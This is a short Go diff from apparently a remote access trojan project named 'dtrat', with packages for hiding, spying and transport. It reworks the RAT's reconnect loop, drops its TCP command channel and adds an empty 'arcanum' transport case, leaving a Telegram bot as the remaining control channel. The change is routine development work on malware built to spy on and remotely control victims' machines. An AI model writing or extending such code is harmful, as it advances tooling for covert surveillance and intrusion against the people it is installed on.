@@ -7,7 +7,6 @@ import (
 	"dtrat/hider"
 	"dtrat/spy"
 	"dtrat/transport"
-	"dtrat/transport/tcp"
 	"fmt"
 	"time"
 )
@@ -33,12 +32,12 @@ func NewRat() (*Rat, error) {
 
 	var tl transport.Transport
 	for range ReconnectAttempts {
-		time.Sleep(30 * time.Second)
-
 		tl, err = choiceTransport(cfg)
 		if err == nil {
 			break
 		}
+
+		time.Sleep(30 * time.Second)
 	}
 
 	if err != nil {
@@ -82,12 +81,8 @@ func choiceTransport(cfg config.Config) (transport.Transport, error) {
 	switch cfg.General.UseTransport {
 	case "telegram":
 		return transport.NewTgBot(cfg)
-	case "tcp":
-		return tcp.NewTCPClient(
-			cfg.Transport.TCP.Addr,
-			time.Duration(cfg.Transport.TCP.ReadTimeout),
-			time.Duration(cfg.Transport.TCP.WriteTimeout),
-		), nil
+	case "arcanum":
+
 	default:
 		return nil, fmt.Errorf("неизвестный транспорт: %s", cfg.General.UseTransport)
 	}
